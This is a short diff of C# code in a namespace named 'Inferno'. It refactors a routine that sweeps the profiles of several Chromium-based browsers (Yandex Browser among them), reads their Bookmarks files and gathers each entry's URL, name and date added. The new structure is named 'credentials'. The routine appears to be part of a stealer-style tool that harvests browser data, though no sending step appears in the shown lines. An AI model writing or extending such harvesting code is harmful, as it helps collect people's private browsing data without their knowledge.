@@ -45,7 +45,7 @@ namespace Inferno
                 l_a + "Yandex\\YandexBrowser" + u_s
             };
 
-            List<string[]> bookmarks = new List<string[]>();
+            List<Dictionary<string, string>> bookmarks = new List<Dictionary<string, string>>();
 
             // Search all browsers
             foreach (string browser in chromiumBasedBrowsers)
@@ -58,13 +58,13 @@ namespace Inferno
                 string bookmarksFile = File.ReadAllText(browser);
                 foreach (var mark in Newtonsoft.Json.Linq.JObject.Parse(bookmarksFile)["roots"]["bookmark_bar"]["children"])
                 {
-                    string[] bookmark = new string[3]
+                    Dictionary<string, string> credentials = new Dictionary<string, string>
                     {
-                        (string)mark["url"],
-                        (string)mark["name"],
-                        Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(mark["date_added"])), TimeZoneInfo.Local))
+                        ["url"] = (string)mark["url"],
+                        ["name"] = (string)mark["name"],
+                        ["date_added"] = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(mark["date_added"])), TimeZoneInfo.Local))
                     };
-                    bookmarks.Add(bookmark);
+                    bookmarks.Add(credentials);
                 }
          
                 continue;
